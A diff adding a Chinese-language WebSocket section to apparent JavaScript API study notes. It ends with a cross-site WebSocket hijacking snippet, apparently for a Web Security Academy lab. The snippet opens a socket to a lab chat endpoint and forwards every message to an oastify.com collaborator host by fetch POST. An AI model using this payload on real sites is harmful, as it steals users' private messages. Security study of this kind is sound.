@@ -416,6 +416,40 @@ https://developer.mozilla.org/zh-CN/docs/Web/API/console
 - `console.trace()` 静态方法
   将堆栈追踪信息输出到控制台
 
+### WebSocket
+
+https://developer.mozilla.org/en-US/docs/Web/API/WebSocket
+
+- `WebSocket()` 构造函数
+  返回一个 WebSocket 对象
+  ```js
+  new WebSocket(url)
+  new WebSocket(url, protocols)
+  ```
+  - url
+    必须使用以下方案之一：ws、wss、http 或 https，且不得包含 URL 片段
+
+- `WebSocket.send()` 方法
+  将需要通过 WebSocket 链接传输至服务器的数据排入队列
+
+```js
+let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");
+
+newWebSocket.onopen = function(evt) {
+    newWebSocket.send("READY");
+}
+
+newWebSocket.onmessage = function(evt) {
+    var message = evt.data;
+
+    fetch("https://id.oastify.com/ws", {
+        method: "POST",
+        mode: 'no-cors', 
+        body: message
+    });
+};
+```
+
 ## 其他
 
 - `setTimeout(函数, 时间)`
